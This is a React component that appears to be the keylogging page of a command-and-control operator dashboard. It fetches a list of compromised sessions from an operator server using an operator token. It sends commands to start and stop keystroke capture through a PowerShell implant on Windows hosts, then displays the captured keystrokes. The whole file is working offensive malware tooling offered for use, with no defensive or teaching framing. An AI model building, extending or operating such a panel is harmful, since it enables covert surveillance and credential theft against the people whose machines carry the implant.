import React, { useEffect, useState } from 'react';
import {
  Box,
  Button,
  FormControl,
  InputLabel,
  MenuItem,
  Paper,
  Select,
  Typography,
  TextField,
} from '@mui/material';
import { PlayArrow as StartIcon, Stop as StopIcon } from '@mui/icons-material';

const API_BASE = process.env.REACT_APP_API_URL || '';
const OP_TOKEN = process.env.REACT_APP_OP_TOKEN || '';

type Session = { id: string; addr: string };

const Keylog: React.FC = () => {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [selected, setSelected] = useState('');
  const [log, setLog] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const fetchSessions = async () => {
    if (!API_BASE) return;
    const headers: HeadersInit = {};
    if (OP_TOKEN) headers['X-Op-Token'] = OP_TOKEN;
    try {
      const res = await fetch(`${API_BASE}/op/sessions`, { headers });
      if (res.ok) {
        const data = await res.json();
        setSessions(Array.isArray(data) ? data : []);
      }
    } catch (_) {}
  };

  useEffect(() => {
    fetchSessions();
  }, []);

  const startKeylog = async () => {
    if (!API_BASE || !selected) {
      setError('Select a session first');
      return;
    }
    setLoading(true);
    setError(null);
    const headers: HeadersInit = { 'Content-Type': 'application/json' };
    if (OP_TOKEN) headers['X-Op-Token'] = OP_TOKEN;
    try {
      const res = await fetch(`${API_BASE}/op/keylog/start`, {
        method: 'POST',
        headers,
        body: JSON.stringify({ session_id: selected }),
      });
      const data = await res.json();
      if (!res.ok) setError(data.error || String(res.status));
      else if (data.status !== 'success') setError(data.error || 'Failed');
    } catch (e) {
      setError(String(e));
    } finally {
      setLoading(false);
    }
  };

  const stopKeylog = async () => {
    if (!API_BASE || !selected) return;
    setLoading(true);
    setError(null);
    setLog('');
    const headers: HeadersInit = { 'Content-Type': 'application/json' };
    if (OP_TOKEN) headers['X-Op-Token'] = OP_TOKEN;
    try {
      const res = await fetch(`${API_BASE}/op/keylog/stop`, {
        method: 'POST',
        headers,
        body: JSON.stringify({ session_id: selected }),
      });
      const data = await res.json();
      if (res.ok && data.status === 'success' && data.output) {
        setLog(data.output);
      } else if (data.error) setError(data.error);
    } catch (e) {
      setError(String(e));
    } finally {
      setLoading(false);
    }
  };

  return (
    <Box>
      <Typography variant="h4" gutterBottom>
        Keylog
      </Typography>
      <Typography variant="body2" color="textSecondary" sx={{ mb: 1 }}>
        Start/stop keylogging on a session (PowerShell implant on Windows). Stop returns captured keystrokes.
      </Typography>
      {!API_BASE && (
        <Typography color="error">Set REACT_APP_API_URL to server base.</Typography>
      )}
      <Paper sx={{ p: 2, mb: 2 }}>
        <FormControl size="small" sx={{ minWidth: 220, mr: 2 }}>
          <InputLabel>Session</InputLabel>
          <Select
            value={selected}
            label="Session"
            onChange={(e) => setSelected(e.target.value)}
          >
            {sessions.map((s) => (
              <MenuItem key={s.id} value={s.id}>
                {s.id} ({s.addr})
              </MenuItem>
            ))}
          </Select>
        </FormControl>
        <Button
          variant="contained"
          startIcon={<StartIcon />}
          onClick={startKeylog}
          disabled={loading || !selected}
          sx={{ mr: 1 }}
        >
          Start
        </Button>
        <Button
          variant="outlined"
          startIcon={<StopIcon />}
          onClick={stopKeylog}
          disabled={loading || !selected}
        >
          Stop and get log
        </Button>
      </Paper>
      {error && (
        <Typography color="error" sx={{ mb: 1 }}>
          {error}
        </Typography>
      )}
      {log !== '' && (
        <Paper sx={{ p: 2 }}>
          <Typography variant="subtitle2" gutterBottom>Captured keystrokes</Typography>
          <TextField
            fullWidth
            multiline
            minRows={6}
            maxRows={20}
            value={log}
            InputProps={{ readOnly: true }}
            variant="outlined"
          />
        </Paper>
      )}
    </Box>
  );
};

export default Keylog;
